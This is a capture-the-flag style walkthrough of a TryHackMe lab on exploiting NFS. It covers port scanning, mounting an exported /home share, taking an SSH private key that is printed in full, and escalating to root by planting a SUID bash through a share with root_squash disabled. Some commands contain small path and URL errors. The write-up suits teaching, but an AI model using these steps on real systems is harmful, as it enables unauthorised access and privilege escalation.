# Enumerating NFS Services

This info is based on information from the TryHackMe Learn Plan, the room: https://tryhackme.com/room/networkservices2

Note that this is done with a vulnerable computer. A computer which has different misconfiguration issues that we will explore here.

## Understanding NFS

### What is NFS?

NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

### How does NFS work?

Computer network - Vector stencils library | Computers ...

We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

* The file handle
* The name of the file to be accessed
* The user's, user ID
* The user's group ID

* These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.

### What runs NFS?

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

More Information:

Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.

https://www.datto.com/library/what-is-nfs-file-share

http://nfs.sourceforge.net/

https://wiki.archlinux.org/index.php/NFS

## Enumerating NFS

### What is Enumeration?

Enumeration is defined as "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system." - [Infosec Institute](https://resources.infosecinstitute.com/what-is-enumeration/). It is a critical phase when considering how to enumerate and exploit a remote machine - as the information you will use to inform your attacks will come from this stage

### Requirements

In order to do a more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine: `nfs-common`.

### NFS-Common

It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: `lockd`, `statd`, `showmount`, `nfsstat`, `gssd`, `idmapd` and `mount.nfs`. Primarily, we are concerned with `showmount` and `mount.nfs` as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: https://packages.ubuntu.com/xenial/nfs-common.

You can install `nfs-common` using `sudo apt install nfs-common`, it is part of the default repositories for most Linux distributions such as the Kali Remote Machine or AttackBox that is provided to TryHackMe.

### Port Scanning

Port scanning has been covered many times before, so I'll only cover the basics that you need for this room here. If you'd like to learn more about nmap in more detail [please have a look at the nmap room](https://tryhackme.com/room/furthernmap).

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. You can go as in-depth as you like on this, however, I suggest using `nmap` with the `-A` and `-p-` tags.

```commandline
# nmap -p- -A 10.10.139.106
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 15:33 CEST
Nmap scan report for 10.10.139.106
Host is up (0.030s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44250/udp   mountd
|   100005  1,2,3      51499/tcp   mountd
|   100005  1,2,3      53605/tcp6  mountd
|   100005  1,2,3      59021/udp6  mountd
|   100021  1,3,4      33037/udp6  nlockmgr
|   100021  1,3,4      35049/udp   nlockmgr
|   100021  1,3,4      36717/tcp6  nlockmgr
|   100021  1,3,4      43315/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
37621/tcp open  mountd   1-3 (RPC #100005)
43315/tcp open  nlockmgr 1-4 (RPC #100021)
51499/tcp open  mountd   1-3 (RPC #100005)
57175/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/1%OT=22%CT=1%CU=34366%PV=Y%DS=2%DC=T%G=Y%TM=6106A2AF
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   30.08 ms 10.8.0.1
2   30.22 ms 10.10.139.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
```

We see a lot of open ports in our nmap scan result. The one that interest us the most is the port `2049/tcp` which is used by `nfs`. However, interesting to see that there's also a `ssh` server running on port `22` and this will be our final goal.

### Mounting NFS shares

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you've created this mount point, you can use the `mount` command to connect the NFS share to the mount point on your machine like so:

```commandline
mkdir /tmp/mount
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```

Let's break this down

| **Tag** | **Function** |
|---|---|
| `sudo` | Run as root |
| `mount` | Execute the mount command |
| `-t nfs` | Type of device to mount, then specifying that it's NFS |
| `IP:share` | The IP Address of the NFS server, and the name of the share we wish to mount |
| `-nolock` | Specifies not to use NLM locking |

Now we understand our tools, let's get started!

## Exploit NFS

If you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

### What is root_squash?

By default, on NFS shares- `Root Squashing` is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user `nfsnobody` when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of `SUID` bit files, allowing a remote user root access to the connected system.

### SUID

So, what are files with the `SUID` bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

### Method

This sounds complicated, but really- provided you're familiar with how `SUID` files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

### The Executable

Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. [You can download it here](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash).

### Mapped Out Pathway

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:

```
NFS Access ->
    Gain Low Privilege Shell ->
        Upload Bash Executable to the NFS share ->
            Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
                Login through SSH ->
                    Execute SUID Bit Bash Executable ->
                        ROOT ACCESS
```

Lets do this!

## Show shares available of remote NFS server

```commandline
showmount -e 10.10.139.106
```

Which will return the available shares:

```
Export list for 10.10.139.106:
/home *
```

It is interesting to see that there's a share. So we should take a closer look to that to see what we can get of information of this.

## Mounting a nfs share

```commandline
mkdir /tmp/mount
mount -t nfs 10.10.139.106:/home /tmp/mount/ -nolock
```

So let's take a look what we can see into these share.

```commandline
# ls -lah /tmp/mount/
total 12K
drwxr-xr-x  3 root           root           4.0K Apr 22  2020 .
drwxrwxrwt 14 root           root           4.0K Aug  1 15:39 ..
drwxr-xr-x  5 dvanmosselbeen dvanmosselbeen 4.0K Jun  4  2020 cappucino
```

After looking around I found something very interesting

```commandline
┌──(root💀vm-dsktp-kali)-[/home/itchy]
└─# cd /tmp/mount/cappucino

┌──(root💀vm-dsktp-kali)-[/tmp/mount/cappucino]
└─# ls -lah
total 36K
drwxr-xr-x 5 dvanmosselbeen dvanmosselbeen 4.0K Jun  4  2020 .
drwxr-xr-x 3 root           root           4.0K Apr 22  2020 ..
-rw------- 1 dvanmosselbeen dvanmosselbeen    5 Jun  4  2020 .bash_history
-rw-r--r-- 1 dvanmosselbeen dvanmosselbeen  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dvanmosselbeen dvanmosselbeen 3.7K Apr  4  2018 .bashrc
drwx------ 2 dvanmosselbeen dvanmosselbeen 4.0K Apr 22  2020 .cache
drwx------ 3 dvanmosselbeen dvanmosselbeen 4.0K Apr 22  2020 .gnupg
-rw-r--r-- 1 dvanmosselbeen dvanmosselbeen  807 Apr  4  2018 .profile
drwx------ 2 dvanmosselbeen dvanmosselbeen 4.0K Apr 22  2020 .ssh
-rw-r--r-- 1 dvanmosselbeen dvanmosselbeen    0 Apr 22  2020 .sudo_as_admin_successful

┌──(root💀vm-dsktp-kali)-[/tmp/mount/cappucino]
└─# ls -lah .ssh
total 20K
drwx------ 2 dvanmosselbeen dvanmosselbeen 4.0K Apr 22  2020 .
drwxr-xr-x 5 dvanmosselbeen dvanmosselbeen 4.0K Jun  4  2020 ..
-rw------- 1 dvanmosselbeen dvanmosselbeen  399 Apr 22  2020 authorized_keys
-rw------- 1 dvanmosselbeen dvanmosselbeen 1.7K Apr 22  2020 id_rsa
-rw-r--r-- 1 dvanmosselbeen dvanmosselbeen  399 Apr 22  2020 id_rsa.pub

┌──(root💀vm-dsktp-kali)-[/tmp/mount/cappucino]
└─# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA03JNcEu6K3LnfFYhiSjWMa4KxT4Q4KTh9uNxQaBBYHwnc7+1
nFl4FICPhjz8kLHmz826wDGU/x46RJno7l1n0Y4y5VTOX/oaGpTdmmbfUwGYvOPu
3Fj92rPoqu/RcFBNbrnqfpfajeinkMwtcOLBOpSak13P8km6JwBzELvKw2a2GL4N
SMzskVW6PNTKiCgwOmFJT4WOivkkgXAnuR4PXt/TSkAgpN3KDCR1a1xDhkO8+zxE
vpDP81rn2PD40lmfeh/yG6wJ9sVlqm1g9IbozHABaTPhx1d8RDn0Cz6gVvsNtS6h
yqBQazUtOOxreHunzRpabp3kAWf/Ao62fTR9hwIDAQABAoIBAQDRGQK9XxW+q8WB
LofBZJHU1SCvhz4XeNZAWREB7eFY8c3t6BJHiC54T94eyKaWzGbM7syUDTQjyZej
iXRQbCwjjfSE1wWy4df4m2g9rSeBpV2OxfTLEHIRWcJnb/r0j2TTb6UWBUNK/Fzg
kxkIviSJsrTdsHLYTdJ5iTdAwAS2j0mjTSVfUOjeB8kSF6o+e73a2PYpsh8gzh7i
Pj82ge1fXoA4Vkg+0Evv1ZoS3VDhJYhWfBrIr/l/JF52PPZfcELpl8ZCkAnXIL9M
bZomittLwudvtqTmADye2LhPu59vnz8SRQYiCLj/ICxz+Zo5syPRc4tQKw91VYMe
IWYQ+sG5AoGBAPj7v02GAhgp9v5yh/1VyAv0zRmSfbinyVeAywZELi2r93WMz2zL
Be3Ys35tlNxvpCHZQO8X23oWeYXkOmIw4OYJcPwHN48QilV1JO1G6jW362oefH4L
rHW/PXgW4Ur3/gMdSeiOtolT+Hz7weg+89begWkHSvSvDS6p9Jw8BE3dAoGBANln
wEKg+YLJpzBzuTOzUle/K6vsCQl5wynMz80t2Ntu0SAmsx7itX7cPMfjjIYjVkx3
kPA76EdZjI51fN0XKlJwUj7t//mj/VyO7iKdQkBiLfADDMmjawYk1hfFaAufTwSz
pXEfEQBzR+iF2uHjDd8cRUkQjibcr67pAawuN3yzAoGBALz47bhcJojKiQGUUeyQ
R9XzRhvLmIonJuS4Bt/JrbbSV24rol8zNFvSZmFlsF8iiNN7/hG57MWb+z4I+9r8
uCVAMzXGEIAQEL5Nu+ovMaH15sJTQy+zkoCH1pKn4vSwhmU8vJS6hIZ0ahwKRKEN
7qo9lMDvXQ+bMQkiy1otHyMtAoGBALj6kBmhAeuITJrrO/+DamKCpFPpx16qnaXp
QD4h7kv2pDUo+GslFqxUE9s3/476bikt6sKdFmvvA6sKyC0N0tLGAxTMSGpOX/rr
Gi+VgpNpdhCrZ6wBQcS+fvNG4dpRuFgVyoTPnBW4AM0VZ0GfgWP+l+0tCuaCC3FV
jDjGMiwFAoGAZeCCUXGze0dQpLsPK+phVf6mpYu9wD2EtNbj8ivGnEMMmuyTPxlW
puGt3aJ1+8YqgfPu6QhE/VgroYLOpww8GxnFeMhMgeOuJG+OtgVVAYpgoSRgVTXS
EGWF78kzFB6HSJBYnpr6LCFp8SRXKYeHEzR9upT30+F4RNaEJqvK6Ng=
-----END RSA PRIVATE KEY-----
```

We can make use of this misconfiguration to copy the private `id_rsa` key for ssh access of user `cappucino`. So we need to copy this file somewhere and then `chmod 600 id_rsa` to make sure this is only readable by us! Or just make straight use of it in this example. It could be that  the private key  request a passphrase, but then we can try to brut force the `id_rsa` key with `john`. Here it's not the case, and we can make use of it to log into a ssh server without a password:

```commandline
ssh -i .ssh/id_rsa cappucino@10.10.139.106
The authenticity of host '10.10.139.106 (10.10.139.106)' can't be established.
ECDSA key fingerprint is SHA256:YZbI4MCk+BQgHK2gc4cdmXuPTzO6m8CtiVRkPalFhlU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.139.106' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug  1 14:01:10 UTC 2021

  System load:  0.0               Processes:           102
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.139.106
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.


Last login: Thu Jun  4 14:37:50 2020
cappucino@polonfs:~$
```

Get of this remote shell connection for the moment as we to download the `bash` executable into our `~/Downloads/`. And then we need to change the ownership of the bash file to root user (`sudo chown root bash`) and finally set the `SUID` bit on the `bash` executable.

```commandline
cd ~/Downloads
wget https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
```

We are now ready to copy this `bash` executable to the home folder on our share we have mounted:

```commandline
cp ~/Downloads/bash /tmp/mount/cappucino
sudo chown root /tmp/mount/cappucinobash
sudo chmod +s /tmp/mount/cappucinobash
```

You will see with `ls -lah` that mode of `bash` changed from:

```commandline
-rwxr-xr-x  1 root  itchy 1.1M Jul 31 17:08 bash
```

To:

```commandline
-rwsr-sr-x  1 root  itchy 1.1M Jul 31 17:08 bash
```

And that in the shell, the `bash` file has another color now.

Now we are ready to log in back to the ssh server with the credentials we have got:

```commandline
cd /tmp/mount/cappucino
ssh -i .ssh/id_rsa cappucino@10.10.139.106
```

We are now back logged in and let's try a sanity check for sure:

```commandline
cappucino@polonfs:~$ ls -lah
total 1.1M
drwxr-xr-x 5 cappucino cappucino 4.0K Aug  1 14:16 .
drwxr-xr-x 3 root      root      4.0K Apr 21  2020 ..
-rwsr-sr-x 1 root      root      1.1M Aug  1 14:19 bash
-rw------- 1 cappucino cappucino   18 Aug  1 14:25 .bash_history
-rw-r--r-- 1 cappucino cappucino  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cappucino cappucino 3.7K Apr  4  2018 .bashrc
drwx------ 2 cappucino cappucino 4.0K Apr 22  2020 .cache
drwx------ 3 cappucino cappucino 4.0K Apr 22  2020 .gnupg
-rw-r--r-- 1 cappucino cappucino  807 Apr  4  2018 .profile
drwx------ 2 cappucino cappucino 4.0K Apr 22  2020 .ssh
-rw-r--r-- 1 cappucino cappucino    0 Apr 22  2020 .sudo_as_admin_successful
```

Now we can run `./bash -p`. The `-p` parameter is to keep persistent permissions, so that it can run as root with SUID as otherwise bash will sometimes drop the permissions.

```commandline
cappucino@polonfs:~$ ./bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=1000(cappucino) gid=1000(cappucino) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(cappucino)
bash-4.4#
```

As you can see, we are `root` user now and have full access on this computer.
